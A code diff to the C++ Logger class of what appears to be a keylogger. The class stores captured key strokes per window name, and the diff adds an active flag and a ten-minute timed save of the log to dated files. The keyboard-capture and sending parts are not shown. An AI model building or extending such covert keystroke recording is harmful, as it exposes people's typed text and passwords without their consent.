@@ -4,6 +4,7 @@
 // Logger(string) : Constructor of the Logger class
 Logger::Logger()
 {
+	this->SetActive(true);
 	this->SetDate(Utilities::GetCurrentDate());
 }
 
@@ -26,7 +27,7 @@ void Logger::Insert(string window_name, int key_input)
 void Logger::Add(string window_name, int key_stroke)
 {
 	// Make sure log is up to date befre adding anything
-	this->UpdateLog();
+	this->Update();
 
 	// Check if key stroke is mapped if not map_key == "" 
 	string map_key = Keys.Map[key_stroke];
@@ -49,53 +50,25 @@ void Logger::Add(string window_name, int key_stroke)
 	}
 }
 
-// UpdateLog() : Update the log date and save and clean log when date change
-void Logger::UpdateLog()
+// Update() : Update the log date and save and clean log when date change
+void Logger::Update()
 {
-	// If current date is different than log date
-	if (this->GetDate() != Utilities::GetCurrentDate())
+	//
+	if (this->Timer.getElapsedTime() >= seconds(60*10))
 	{
 		// Save log to file with the old date as file name
 		this->SaveToFile();
 
-		// Clear map log
-		this->Log.clear();
+		// If current date is different than log date
+		if (this->GetDate() != Utilities::GetCurrentDate())
+		{
+			// Clear map log
+			this->Log.clear();
 
-		// Update the log date
-		this->SetDate(Utilities::GetCurrentDate());
+			// Update the log date
+			this->SetDate(Utilities::GetCurrentDate());
+		}
 	}
-}
-
-// GetLog(string) : Return the key log for a specific window
-string Logger::GetLog(string window_name) 
-{
-	return this->Log.find(window_name)->second;
-}
-
-// GetLog(string) : Return all the key log for all window
-string Logger::GetLog()
-{
-	string log = "";
-
-	// Go through all the log
-	for (map<string, string>::iterator iter = Log.begin(); iter != Log.end(); ++iter)
-	{
-		log += iter->first + " > " + iter->second;
-	}
-
-	return log;
-}
-
-// GetPath() : Return the path to the log file
-string Logger::GetDate() const
-{
-	return this->Date;
-}
-
-// SetPath(string) :  Set the path of the log file
-void Logger::SetDate(string date)
-{
-	this->Date = date;
 }
 
 // SaveToFile() : Save Map content to file
@@ -139,4 +112,48 @@ bool Logger::LoadFromFile()
 		file.close();
 		return true;
 	}
+}
+
+// GetLog(string) : Return the key log for a specific window
+string Logger::GetLog(string window_name) 
+{
+	return this->Log.find(window_name)->second;
+}
+
+// GetLog(string) : Return all the key log for all window
+string Logger::GetLog()
+{
+	string log = "";
+
+	// Go through all the log
+	for (map<string, string>::iterator iter = Log.begin(); iter != Log.end(); ++iter)
+	{
+		log += iter->first + " > " + iter->second;
+	}
+
+	return log;
+}
+
+// GetPath() : Return the path to the log file
+string Logger::GetDate() const
+{
+	return this->Date;
+}
+
+// SetPath(string) :  Set the path of the log file
+void Logger::SetDate(string date)
+{
+	this->Date = date;
+}
+
+// GetActive() : Return the log status attribut
+bool Logger::GetActive() const
+{
+	return this->Active;
+}
+
+// SetActive(bool) : Set the status attribut of log
+void Logger::SetActive(bool status)
+{
+	this->Active = status;
 }
